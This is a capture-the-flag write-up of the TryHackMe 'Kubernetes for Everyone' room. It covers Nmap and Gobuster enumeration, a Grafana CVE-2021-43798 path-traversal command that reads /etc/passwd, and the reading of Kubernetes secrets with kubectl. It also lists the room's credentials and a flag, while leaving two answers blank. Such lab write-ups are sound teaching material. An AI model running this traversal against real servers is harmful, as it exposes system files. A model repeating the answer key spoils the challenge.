<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Kubernetes for Everyone}}$$</h1>
<p align="center"><img width="180px" src="https://github.com/user-attachments/assets/dea7aa5d-00b4-4a3a-a417-28d7040d7c9c"><br>
May 27, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my $$\textcolor{#FF69B4}{\textbf{386}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
A Kubernetes hacking challenge for DevOps/SRE enthusiasts. Access it clicking <a href="https://tryhackme.com/room/kubernetesforyouly"</a>here.<br><br>
<img width="1000px" src=""></p>

<br>
<br>




<h2>Task 1 . Access the Cluster</h2>

<p>To access a cluster, you need to know the location of the K8s cluster and have credentials to access it. Compromise the cluster and best of luck.<br><br>

Use Nmap to find open ports and gain a foothold by exploiting a vulnerable service. If you are new at Nmap, take a look at the <code>Nmap room</code>.</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>Find the username?</em><br><a id='1.1'></a>
>> <strong><code>vagrant</code></strong><br>
<p></p>


<br>

> 1.2. <em>Find the password?</em><br><a id='1.2'></a>
>> <strong><code>hereiamatctf907</code></strong><br>
<p></p>


<br>

<h2>Enumeration</h2>
<h3>Nmap</h3>


```bash
:~/Kubernetes-for-Everyone# nmap -sC -sV -T4 -p- TargetIP
...
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
111/tcp  open  rpcbind           2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 27 May 2025 21:19:36 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 27 May 2025 21:19:06 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 27 May 2025 21:19:11 GMT
|_    Content-Length: 0
5000/tcp open  http              Werkzeug httpd 2.0.2 (Python 3.8.12)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.12
|_http-title: Etch a Sketch
6443/tcp open  ssl/sun-sr-https?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 10e96b0e-2fff-483e-9448-5fab506d384a
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 27 May 2025 21:19:37 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 393ec30b-9c0a-40be-9586-25b3f82cdbc5
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 27 May 2025 21:19:12 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 13a5e863-a6a0-4f37-8708-b1e5424fe7be
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 27 May 2025 21:19:12 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=kubernetes/organizationName=kubernetes
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.svc.cluster.local, DNS:localhost, IP Address:127.0.0.1, IP
...
```

<br>

<h3>Gobuster</h3>

```bash
:~/Kubernetes-for-Everyone# gobuster dir -u http://TargetIP:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 28034 -t 100 -r -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP:3000
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          28034
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/signup               (Status: 200) [Size: 27985]
...
/robots.txt           (Status: 200) [Size: 26]
/verify               (Status: 200) [Size: 27985]
/metrics              (Status: 200) [Size: 45373]
/apis                 (Status: 401) [Size: 32]
/apis.txt             (Status: 401) [Size: 32]
/apis.php             (Status: 401) [Size: 32]
/apis.html            (Status: 401) [Size: 32]
...
/apilist.txt          (Status: 401) [Size: 32]
/apilist.php          (Status: 401) [Size: 32]
/apilist              (Status: 401) [Size: 32]
/apilist.html         (Status: 401) [Size: 32]

```

<br>

<br>

<h3>Website</h3>
<p><code>Grafana</code>:<code>v8.3.0</code></p>

![image](https://github.com/user-attachments/assets/40b58445-501e-4a01-ba8c-4cd00accdad8)

<br>

<h3>ExploitDB</h3>
<p>CVE-2021-43798</p>

![image](https://github.com/user-attachments/assets/1457482a-11fd-4cd4-afc8-f3e18cd77c86)

<br>

<h3>Pluma</h3>

![image](https://github.com/user-attachments/assets/af434670-731d-4e03-a376-9eb57444b6b9)

<br>

```bash
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
```

<br>

```bash
curl http://TargetIP:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd --path-as-is
```

<br>

<p><code>hereiamatctf907</code> might be a password.</p>

![image](https://github.com/user-attachments/assets/8c485fd9-0913-448e-8d4d-b23bb5373afe)


<br>

<h3>Website, another</h3>

![image](https://github.com/user-attachments/assets/f4a4d871-635a-4390-aac1-7404a4529ed4)

<br>

![image](https://github.com/user-attachments/assets/25d1d09a-2982-4374-ba8c-804f7dec1f1f)


<br>

![image](https://github.com/user-attachments/assets/cff733da-b6d3-43de-8b38-0b23b8c7ab6e)



<br>

<h3>Pastebin</h3>

![image](https://github.com/user-attachments/assets/10dc9cc4-ef3d-43fd-9ed6-aba549b4b9d1)

<br>

<p><code>OZQWO4TBNZ2A====</code></p>

<br>

<h3>CyberChef</h3>

![image](https://github.com/user-attachments/assets/1c2b362e-e256-4998-bf22-8bc144173a7b)

<br>
<br>


<h2>Task 2 . Your Secret Crush</h2>
<p>If you want to keep a secret, you must also hide it from yourself. Find the secret!</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>


> 2.1. <em>What secret did you find?</em><br><a id='2.1'></a>
>> <strong><code>THM{yes_there_$s_no_$ecret}</code></strong><br>
<p></p>


<br>

<h3>SSH</h3>

<br>

![image](https://github.com/user-attachments/assets/9c28f11e-41f7-4eed-b68e-d9d9318cca70)

<br>

![image](https://github.com/user-attachments/assets/83a72478-074e-4cb7-9283-49d518b04e70)



<br>

<h3>ps aux</h3>

```bash
root@johnny:~# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
kube-sc+  1647  0.1  1.6 754040 16496 ?        Sl   20:49   0:07 /var/lib/k0s/bin/kube-scheduler --authorization-kubeconfig
kube-ap+  1663  2.0  5.2 768320 51620 ?        Sl   20:49   2:01 /var/lib/k0s/bin/kube-controller-manager --authorization-k
root      1941  0.0  0.0      0     0 ?        I    21:47   0:00 [kworker/0:0]
...
```

<br>

<h3>k0s kubectl</h3>

```bash
root@johnny:~# k0s kubectl get secret
NAME                  TYPE                                  DATA   AGE
default-token-nhwb5   kubernetes.io/service-account-token   3      3y107d
k8s.authentication    Opaque                                1      3y107d
root@johnny:~# 
...
k0s kubectl edit secret k8s.authentication
...
  id: VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9
kind: Secret

```

<br>

![image](https://github.com/user-attachments/assets/377e3e58-bd52-4935-b64f-54ea46fc7009)

<br>

<h3>CyberChef</h3>

<br>

![image](https://github.com/user-attachments/assets/c836a17e-41bb-46c4-afe1-563f8378528d)


<br>



<h2>Task 3 . Powerhouse of Pod´s Storage</h2>
<p>Pods are the smallest deployable computing units you can create and manage in Kubernetes. <br><br>

The Pod also shares storage.  Enumerate the pod-shared storage location and find the flag!</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>


> 3.1. <em>What is the volume flag?</em><br><a id='3.1'></a>
>> <strong><code>______</code></strong><br>
<p></p>


<br>

<h3>k0s kubectl get pods -A</h3>

```bash
root@johnny:~# k0s kubectl get pods -A
NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
internship    internship-job-5drbm              0/1     Completed   0          3y107d
kube-system   kube-router-vsq85                 1/1     Running     0          3y107d
kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          3y107d
kube-system   kube-api                          1/1     Running     0          3y107d
kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          3y107d
kube-system   kube-proxy-jws4q                  1/1     Running     0          3y107d
root@johnny:~# 
```

<br>
<br>


<h2>Task 4 . Hack a Job at FANG</h2>

<p>You have been shortlisted and you have upcoming interview rounds for a FANG company! Find the secret that has been left behind.<br><br>

I hope you have learned a lot through the challenges. Thank you so much for doing my first room and I want to personally thank kiransau. Feel free to provide feedback via Twitter.</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>


> 4.1. <em>What's the secret to the FANG interview?</em><br><a id='4.1'></a>
>> <strong><code>______</code></strong><br>
<p></p>


<br>
<br>
